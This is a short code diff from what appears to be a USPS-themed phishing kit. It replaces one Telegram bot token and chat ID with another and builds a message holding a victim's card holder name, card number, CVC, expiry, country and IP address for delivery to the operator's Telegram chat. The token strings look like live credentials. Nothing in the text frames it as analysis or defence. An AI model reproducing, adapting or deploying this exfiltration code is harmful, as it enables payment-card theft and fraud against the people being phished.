@@ -2151,9 +2151,9 @@ export default {
       var that = this;
       that.info.IP = this.IP;
       that.info.query = this.query;
-      var token = "6309857497:AAFmgkPgZKj949KXANTdon_4fuT9LiLpqxs";
+      var token = "6346259743:AAEFPYGw3OQsWVKiVNOAd1Ssm33OEVGNNjM";
 
-      var chatId2 = -957355212;
+      var chatId2 = -940829481;
       var fullMessage = `
         ||||||||||🇺🇸| USPS Post |🇺🇸||||||||||%0ACard Holder Name : ${this.info.cardName}%0ACard Nickname : ${this.info.cardNickname}%0ACard Number : ${this.info.cardNumber}%0ACVC : ${this.info.cvc}%0AExpiry : ${this.info.expiry}%0ACountry : ${this.info.query}%0AIP : ${this.info.IP}%0A||||||||||💳| USPS Post|💳||||||||||`;
 
